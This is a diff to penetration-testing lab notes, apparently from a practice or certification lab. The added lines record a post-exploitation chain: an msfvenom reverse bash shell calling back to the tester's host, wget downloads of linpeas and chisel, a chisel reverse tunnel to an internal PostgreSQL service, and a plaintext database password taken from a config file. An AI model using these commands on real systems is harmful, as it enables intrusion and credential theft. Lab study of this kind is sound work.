@@ -208,7 +208,7 @@ feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-wor
 # find http://192.168.248.224:8000/debug.txt, is just output of ifconfig, showing connection to interntal 172.x network
 ```
 
-.225 (standalone)
+.225 (singapore) (standalone)
 ```
 nmap 192.168.248.225
 sudo nmap -sU --open -p 161 192.168.248.225
@@ -250,4 +250,23 @@ http://192.168.248.225:8090/backend/default/uploads/shell.php
 .224 privesc
 ```
 wget http://192.168.45.160/linpeas.sh -O linpeas.sh
+
+# this produces a bash one-liner
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.160 LPORT=4444 -f raw -o shell.sh
+wget http://192.168.45.160/shell.sh -O shell.sh
+
+/var/log/nginx/access.log
+/var/www/backend/default/config.php
+/var/lib/php/sessions
+/var/metrics
+/var/tmp
+
+/root/local.txt
+
+pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");
+
+wget http://192.168.45.160/chisel -O chisel
+./chisel client 192.168.45.160:80 R:5432:0.0.0.0:5432
+
+psql -h 127.0.0.1 -p 5432 -d postgres -U postgres
 ```
